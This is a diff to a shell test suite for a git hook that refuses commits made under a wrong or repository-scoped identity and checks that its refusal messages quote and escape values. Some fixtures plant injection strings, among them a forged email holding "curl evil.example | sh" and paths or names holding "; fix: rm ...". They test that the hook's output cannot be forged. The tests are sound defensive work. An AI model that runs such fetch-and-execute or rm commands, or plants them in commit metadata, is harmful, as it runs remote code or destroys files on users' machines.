@@ -10,7 +10,8 @@
 # `make commit-identity` gate. The rule: an email or name under user, author
 # or committer at git config scope `local` or `worktree` is refused; `-c` per
 # command, the GIT_AUTHOR_*/GIT_COMMITTER_* variables and the global scope are
-# allowed.
+# allowed. pre-push also refuses a pushed commit, not yet on a remote, whose
+# author or committer email differs from the effective identity.
 #
 # Every case runs in scratch repositories under a scratch HOME, with
 # GIT_CONFIG_GLOBAL pointing at a scratch file and GIT_CONFIG_NOSYSTEM set, so
@@ -316,11 +317,41 @@ if git -C "$r" push -q origin topic 2>"$work/err"; then
   fail "pre-push must refuse after a rebase under a repository-scoped identity"
 fi
 grep -q 'pre-push: refusing: user.email' "$work/err" || fail "the pre-push refusal must name the key: $(err)"
+! grep -q 'refusing: commit ' "$work/err" \
+  || fail "a config refusal must not list commits against a polluted identity: $(err)"
 if git -C "$remote" rev-parse -q --verify refs/heads/topic >/dev/null; then
   fail "a refused push must not create the remote branch"
 fi
 ok "pre-push refuses after a rebase under a repository-scoped identity"
+
+# The identity removed before the push: config is clean again, but the
+# rebased commit still carries a@b as its committer.
 git -C "$r" config --unset-all user.email
+bad="$(git -C "$r" rev-parse HEAD)"
+if git -C "$r" push -q origin topic 2>"$work/err"; then
+  fail "pre-push must refuse a commit made under an identity removed since"
+fi
+want="commit-identity: pre-push: refusing: commit $bad has committer email"
+want="$want 'a@b', not the effective 'g@x'"
+grep -qxF "$want" "$work/err" || fail "the commit refusal line is not what was expected: $(err)"
+grep -q "^commit-identity: pre-push: a pushed commit must carry the effective identity" "$work/err" \
+  || fail "the commit refusal must end with its pointer line: $(err)"
+[ "$(grep -c '^commit-identity: ' "$work/err")" -eq 2 ] \
+  || fail "one line for the committer, none for the matching author, one pointer: $(err)"
+if git -C "$remote" rev-parse -q --verify refs/heads/topic >/dev/null; then
+  fail "a refused push must not create the remote branch"
+fi
+ok "pre-push refuses a commit made under an identity removed before the push"
+
+# docs/development.md quotes this refusal line too; hold it to the output.
+doc_line="$(grep -E "^commit-identity: pre-push: refusing: commit " "$repo_root/docs/development.md")" \
+  || fail "docs/development.md no longer quotes the pre-push commit refusal line"
+grep -qxF "${doc_line//<oid>/$bad}" "$work/err" \
+  || fail "the pre-push line docs/development.md quotes drifted from the output: $(err)"
+ok "the pre-push commit refusal line docs/development.md quotes matches the output"
+
+git -C "$r" commit -q --amend --no-edit --reset-author 2>"$work/err" \
+  || fail "fixture: the amend was refused: $(err)"
 
 # Every push shape git can hand pre-push on stdin, with a clean config.
 git -C "$r" push -q origin topic 2>"$work/err" || fail "pre-push: a new branch must pass: $(err)"
@@ -328,26 +359,217 @@ git -C "$r" push -q origin :topic 2>"$work/err" || fail "pre-push: a deletion mu
 git -C "$r" tag -a -m t v1 2>"$work/err" || fail "fixture: tag: $(err)"
 git -C "$r" push -q origin v1 2>"$work/err" || fail "pre-push: a tag push must pass: $(err)"
 other="$work/other"; git clone -q "$remote" "$other"
-try_commit "$other" || fail "fixture: other commit refused: $(err)"
+# A message of its own: r made an empty "m" commit on the same parent under
+# the same identity, and within one second the two would be one object, so
+# r would know the remote oid after all.
+git -C "$other" commit -q --allow-empty -m other 2>"$work/err" \
+  || fail "fixture: other commit refused: $(err)"
 git -C "$other" push -q origin main 2>"$work/err" || fail "fixture: other push: $(err)"
 # r has never fetched other's commit, so the remote oid on stdin is unknown here.
+if git -C "$r" cat-file -e "$(git -C "$other" rev-parse HEAD)" 2>/dev/null; then
+  fail "fixture: r already holds other's commit, so the missing-oid case is vacuous"
+fi
 git -C "$r" push -q --force origin main 2>"$work/err" \
   || fail "pre-push: a missing remote oid must pass: $(err)"
 git -C "$r" remote add fork "$work/fork.git"; git init -q --bare "$work/fork.git"
 git -C "$r" push -q fork main 2>"$work/err" || fail "pre-push: a second remote must pass: $(err)"
 ok "pre-push tolerates a new branch, a deletion, a tag push and a missing remote oid"
 
+# git writes the source of a refspec as LOCAL_REF verbatim, so it can hold
+# spaces: only the last three fields of a ref line are fixed.
+git -C "$r" commit -q --allow-empty -m "fix bug" 2>"$work/err" \
+  || fail "fixture: the 'fix bug' commit was refused: $(err)"
+git -C "$r" push -q origin 'HEAD^{/fix bug}:refs/heads/spaced' 2>"$work/err" \
+  || fail "pre-push: a source expression with spaces must pass: $(err)"
+ok "pre-push reads a ref line whose local ref holds spaces"
+
+# An author or a committer that differs on its own is refused, and each
+# offending commit gets its own line.
+git -C "$r" checkout -q -b mixed main
+GIT_AUTHOR_EMAIL=au@x try_commit "$r" || fail "fixture: author commit refused: $(err)"
+c_author="$(git -C "$r" rev-parse HEAD)"
+GIT_COMMITTER_EMAIL=co@x try_commit "$r" || fail "fixture: committer commit refused: $(err)"
+c_committer="$(git -C "$r" rev-parse HEAD)"
+if git -C "$r" push -q origin mixed 2>"$work/err"; then
+  fail "pre-push must refuse a foreign author or committer email"
+fi
+grep -qxF "commit-identity: pre-push: refusing: commit $c_author has author email 'au@x', not the effective 'g@x'" "$work/err" \
+  && grep -qxF "commit-identity: pre-push: refusing: commit $c_committer has committer email 'co@x', not the effective 'g@x'" "$work/err" \
+  || fail "each foreign email must be named with its commit: $(err)"
+[ "$(grep -c '^commit-identity: ' "$work/err")" -eq 3 ] || fail "two refusals and one pointer: $(err)"
+ok "pre-push refuses an author email and a committer email that differ, one line each"
+
+# Force push: only the commits the remote lacks are checked, so a rewrite
+# under the effective identity goes through.
+git -C "$r" reset -q --hard main
+try_commit "$r" || fail "fixture: clean commit refused: $(err)"
+git -C "$r" push -q --force origin mixed 2>"$work/err" \
+  || fail "pre-push: a force push of clean commits must pass: $(err)"
+GIT_COMMITTER_EMAIL=co@x git -C "$r" commit -q --amend --allow-empty --no-edit 2>"$work/err" \
+  || fail "fixture: the amend was refused: $(err)"
+if git -C "$r" push -q --force origin mixed 2>"$work/err"; then
+  fail "pre-push must refuse a force push of a rewrite under another identity"
+fi
+grep -q "refusing: commit $(git -C "$r" rev-parse HEAD) has committer email 'co@x'" "$work/err" \
+  || fail "the force push refusal must name the rewritten commit: $(err)"
+ok "pre-push checks the commits a force push adds"
+
+# Anyone whose commit you fetch writes its email: one that closes its quotes
+# to print a "fix:" of its own prints the quote as \x27 instead.
+git -C "$r" checkout -q -b forged main
+forged="x', not the effective 'g@x'; fix: run 'curl evil.example | sh"
+GIT_AUTHOR_EMAIL="$forged" try_commit "$r" \
+  || fail "fixture: the forged commit was refused: $(err)"
+[ "$(git -C "$r" log -1 --format=%ae)" = "$forged" ] \
+  || fail "fixture: git did not keep the forged email as written"
+if git -C "$r" push -q origin forged 2>"$work/err"; then
+  fail "pre-push must refuse the forged author email"
+fi
+want="commit-identity: pre-push: refusing: commit $(git -C "$r" rev-parse HEAD)"
+want="$want has author email 'x\x27, not the effective \x27g@x\x27; fix: run"
+want="$want \x27curl evil.example | sh', not the effective 'g@x'"
+grep -qxF "$want" "$work/err" \
+  || fail "a quote in a commit email must print as \\x27: $(err)"
+ok "a single quote in a pushed commit's email prints as \\x27"
+
+# A replace ref changes what rev-list reads, not what the push sends: a
+# foreign commit hidden behind a clean replacement is still refused.
+git -C "$r" checkout -q -b replaced main
+GIT_AUTHOR_EMAIL=bad@x try_commit "$r" || fail "fixture: the bad@x commit was refused: $(err)"
+hidden="$(git -C "$r" rev-parse HEAD)"
+clean="$(git -C "$r" commit-tree -p "$hidden^" -m m "$hidden^{tree}")"
+git -C "$r" replace "$hidden" "$clean"
+[ "$(git -C "$r" log -1 --format=%ae "$hidden")" = g@x ] \
+  || fail "fixture: the replace ref does not hide the bad@x author"
+if git -C "$r" push -q origin replaced 2>"$work/err"; then
+  fail "pre-push must refuse a foreign commit hidden behind a replace ref"
+fi
+grep -qF "refusing: commit $hidden has author email 'bad@x'" "$work/err" \
+  || fail "the refusal must name the original commit and its email: $(err)"
+git -C "$r" replace -d "$hidden" >/dev/null
+ok "a replace ref cannot hide a pushed commit's identity"
+
+# Many offending commits: the first 20 are named, then one line counts the
+# rest, so a long rebase does not flood the terminal.
+git -C "$r" checkout -q -b many main
+for _ in $(seq 25); do
+  GIT_COMMITTER_EMAIL=co@x try_commit "$r" || fail "fixture: commit refused: $(err)"
+done
+if git -C "$r" push -q origin many 2>"$work/err"; then
+  fail "pre-push must refuse 25 foreign commits"
+fi
+[ "$(grep -c '^commit-identity: pre-push: refusing: commit ' "$work/err")" -eq 20 ] \
+  && grep -qxF "commit-identity: pre-push: refusing: and 5 more commits whose email differs" "$work/err" \
+  || fail "20 commit lines, then one line counting the other 5: $(err)"
+ok "pre-push names the first 20 offending commits and counts the rest"
+
+# docs/development.md states the cap; hold it to MAX_COMMITS.
+cap="$(sed -n 's/^MAX_COMMITS = \([0-9][0-9]*\)$/\1/p' "$repo_root/.githooks/commit_identity.py")"
+[ -n "$cap" ] || fail "commit_identity.py no longer sets MAX_COMMITS = <n>"
+# tr joins the wrapped lines; grep -c drains its input (no SIGPIPE).
+[ "$(tr '\n' ' ' < "$repo_root/docs/development.md" \
+  | grep -cF "The first $cap offending commits")" -ge 1 ] \
+  || fail "docs/development.md must state the cap of $cap offending commits"
+ok "the cap docs/development.md states matches MAX_COMMITS"
+
+# Any ref under refs/remotes/ counts as published, configured remote or not:
+# pinned, so a change to that rule is a decision, not a side effect.
+git -C "$r" checkout -q -b byhand main
+GIT_AUTHOR_EMAIL=hand@x try_commit "$r" || fail "fixture: the hand@x commit was refused: $(err)"
+git -C "$r" update-ref refs/remotes/nobody/x HEAD
+git -C "$r" push -q origin byhand 2>"$work/err" \
+  || fail "pre-push: a commit under a hand-made refs/remotes/ ref is not compared: $(err)"
+git -C "$r" update-ref -d refs/remotes/nobody/x
+ok "a commit a hand-made refs/remotes/ ref reaches is not compared"
+
+# A commit already on a remote passes, whoever made it, and so does a merge
+# of it; a merge commit made under another identity is refused.
+# fetch and reset, not pull: a pull would merge other's diverged main as a
+# new g@x commit that the -c o@x push below would then refuse.
+git -C "$other" fetch -q origin 2>"$work/err" || fail "fixture: other fetch: $(err)"
+git -C "$other" reset -q --hard origin/main
+git -C "$other" -c user.email=o@x -c user.name=O commit -q --allow-empty -m o \
+  2>"$work/err" || fail "fixture: other's commit refused: $(err)"
+git -C "$other" -c user.email=o@x -c user.name=O push -q origin main 2>"$work/err" \
+  || fail "pre-push: a push under -c of a commit made under the same -c must pass: $(err)"
+git -C "$other" push -q origin main:refs/heads/again 2>"$work/err" \
+  || fail "pre-push: a commit already on the remote must pass under any identity: $(err)"
+git -C "$r" fetch -q origin
+git -C "$r" checkout -q -b merged mixed~1
+git -C "$r" merge -q --no-ff -m merge origin/main 2>"$work/err" \
+  || fail "fixture: the merge failed: $(err)"
+git -C "$r" push -q origin merged 2>"$work/err" \
+  || fail "pre-push: a merge bringing in a remote's foreign commit must pass: $(err)"
+git -C "$r" checkout -q -b merged2 mixed~1
+try_commit "$r" || fail "fixture: merged2 commit refused: $(err)"
+git -C "$r" -c user.email=m@x merge -q --no-ff -m merge origin/main 2>"$work/err" \
+  || fail "fixture: the merge under m@x failed: $(err)"
+if git -C "$r" push -q origin merged2 2>"$work/err"; then
+  fail "pre-push must refuse a merge commit made under another identity"
+fi
+grep -qxF "commit-identity: pre-push: refusing: commit $(git -C "$r" rev-parse HEAD) has author email 'm@x', not the effective 'g@x'" "$work/err" \
+  || fail "the merge commit must be named: $(err)"
+[ "$(grep -c 'refusing: commit ' "$work/err")" -eq 2 ] \
+  || fail "only the merge commit (author and committer), not the merged ones: $(err)"
+ok "pre-push passes commits already on a remote and a merge of them, and refuses a foreign merge commit"
+
+# Pushing to a URL leaves no remote-tracking ref behind, so only the remote
+# oid on stdin says what the remote already has.
+url="$work/url.git"; git init -q --bare "$url"
+git -C "$r" checkout -q main
+git -C "$r" -c user.email=u@x commit -q --allow-empty -m u 2>"$work/err" \
+  || fail "fixture: the u@x commit was refused: $(err)"
+git -C "$r" -c user.email=u@x push -q "$url" main 2>"$work/err" \
+  || fail "fixture: the push under -c to a URL was refused: $(err)"
+try_commit "$r" || fail "fixture: main commit refused: $(err)"
+git -C "$r" push -q "$url" main 2>"$work/err" \
+  || fail "pre-push: the remote oid must exclude what a URL remote already has: $(err)"
+ok "pre-push excludes what the remote oid names when pushing to a URL"
+
+# No effective identity: nothing to compare against, so a push with commits
+# to check cannot be answered (exit 2), while one without commits can.
+global_config noidentity
+printf '[user]\n\tuseConfigOnly = true\n' >> "$GIT_CONFIG_GLOBAL"
+git -C "$r" -c user.email=n@x -c user.name=N commit -q --allow-empty -m n \
+  2>"$work/err" || fail "fixture: the n@x commit was refused: $(err)"
+set +e
+git -C "$r" push -q origin main:refs/heads/noid 2>"$work/err"
+rc=$?
+set -e
+[ "$rc" -ne 0 ] && grep -q "^commit-identity: cannot read the effective identity" "$work/err" \
+  || fail "pre-push with no effective identity must refuse and say why, got $rc: $(err)"
+git -C "$r" push -q origin :merged 2>"$work/err" \
+  || fail "pre-push: a deletion needs no identity and must pass: $(err)"
+global_config
+ok "pre-push without an effective identity cannot check commits, and passes a deletion"
+
 # --- The message ---------------------------------------------------------------
 r="$work/r 8"; new_repo "$r"
 git -C "$r" config user.email a@b
 if try_commit "$r"; then fail "fixture: the commit in '$r' should be refused"; fi
 want="commit-identity: pre-commit: refusing: user.email 'a@b' is set at"
-want="$want scope local in $r/.git/config; fix: git config --file"
+want="$want scope local in '$r/.git/config'; fix: git config --file"
 want="$want '$r/.git/config' --unset-all user.email"
 grep -qxF "$want" "$work/err" || fail "the refusal line is not what was expected: $(err)"
 grep -qF "git -c user.email=" "$work/err" || fail "the refusal must point at 'git -c user.email=...': $(err)"
 [ "$(wc -l < "$work/err")" -eq 2 ] || fail "one line per offending key plus one pointer, got: $(err)"
-ok "the message names the file and the --unset-all fix, quoted"
+ok "the message names the file and the --unset-all fix, both quoted"
+
+# A path holding its own "; fix: ..." prints quoted, so it cannot pass for a
+# second fix ahead of the real one.
+r="$work/r-plant"; new_repo "$r"
+mkdir "$r/.git/x; fix: rm y"
+printf '[include]\n\tpath = "x; fix: rm y/extra"\n' >> "$r/.git/config"
+printf '[user]\n\temail = i@x\n' > "$r/.git/x; fix: rm y/extra"
+check "$r"
+[ "$rc" -eq 1 ] \
+  || fail "fixture: the planted path should be refused, got $rc: $(err)"
+want="commit-identity: check: refusing: user.email 'i@x' is set at scope"
+want="$want local in '$r/.git/x; fix: rm y/extra'; fix: git config --file"
+want="$want '$r/.git/x; fix: rm y/extra' --unset-all user.email"
+grep -qxF "$want" "$work/err" \
+  || fail "a path holding '; fix:' must print quoted: $(err)"
+ok "a path holding its own '; fix:' prints quoted in the 'in' text"
 
 r="$work/r9"; new_repo "$r"
 git -C "$r" config user.name "$(printf 'x\033[31my\nforged\342\200\256z\\')"
@@ -357,6 +579,15 @@ grep -qF "'x\\x1b[31my\\x0aforged\\u202ez\\\\'" "$work/err" \
 if LC_ALL=C grep -q "$(printf '\033')" "$work/err"; then fail "a raw ESC reached the message"; fi
 [ "$(wc -l < "$work/err")" -eq 2 ] || fail "an LF in a value must not forge a line: $(err)"
 ok "control characters in a value are escaped"
+
+# A quote in a config value cannot close its quotes and add a "fix:" either.
+r="$work/r-quote"; new_repo "$r"
+git -C "$r" config user.name "a'; fix: rm x"
+check "$r"
+[ "$rc" -eq 1 ] || fail "fixture: the quote case should be refused, got $rc"
+grep -qF "refusing: user.name 'a\x27; fix: rm x' is set at scope local" \
+  "$work/err" || fail "a quote in a value must print as \\x27: $(err)"
+ok "a single quote in a config value prints as \\x27"
 
 # Every escape() branch: a byte that is not UTF-8 (\xHH via surrogateescape),
 # DEL and the non-printable 0x80-0xFF range (\xHH), a non-printable astral
@@ -380,7 +611,7 @@ check "$r"
 [ "$rc" -eq 1 ] \
   || fail "fixture: the backslash path should be refused, got $rc: $(err)"
 want="commit-identity: check: refusing: user.email 'i@x' is set at scope"
-want="$want local in $r/.git/in\\\\x/extra; fix: remove user.email from"
+want="$want local in '$r/.git/in\\\\x/extra'; fix: remove user.email from"
 want="$want that file (path shown escaped)"
 grep -qxF "$want" "$work/err" \
   || fail "an escaped path must not print a command: $(err)"
@@ -474,6 +705,31 @@ set -e
   || fail "pre-push must read every ref line, not close the pipe," \
     "got $rc: $(err)"
 ok "pre-push drains a multi-line stdin larger than a pipe buffer"
+
+# It drains before it refuses too: a config refusal exits 1 with every ref
+# line read, so the writer (git) still exits 0, not 141.
+git -C "$r" config user.email a@b
+set +e
+(cd "$work/r10-linked" \
+  && { for _ in $(seq 6000); do printf '%s\n' "$line"; done \
+    | .githooks/pre-push origin "$work/remote.git"
+    echo "${PIPESTATUS[*]}" > "$work/ps"; }) 2>"$work/err"
+set -e
+git -C "$r" config --unset user.email
+[ "$(cat "$work/ps")" = "0 1" ] \
+  || fail "a refusing pre-push must still read every ref line, writer and" \
+    "hook exited $(cat "$work/ps"): $(err)"
+ok "pre-push drains a large stdin before a config refusal"
+
+# A ref line git would never write: the guard cannot tell what is pushed.
+set +e
+(cd "$work/r10-linked" && printf 'refs/heads/side 123 refs/heads/side\n' \
+  | .githooks/pre-push origin "$work/remote.git") 2>"$work/err"
+rc=$?
+set -e
+[ "$rc" -eq 2 ] && grep -qx "commit-identity: pre-push: a ref line on stdin has an unexpected shape" "$work/err" \
+  || fail "pre-push must exit 2 on a ref line of an unexpected shape, got $rc: $(err)"
+ok "pre-push exits 2 on a ref line of an unexpected shape"
 
 # The sandbox's real dispatcher, when this machine has one.
 if [ -x /etc/git/hooks/pre-commit ]; then
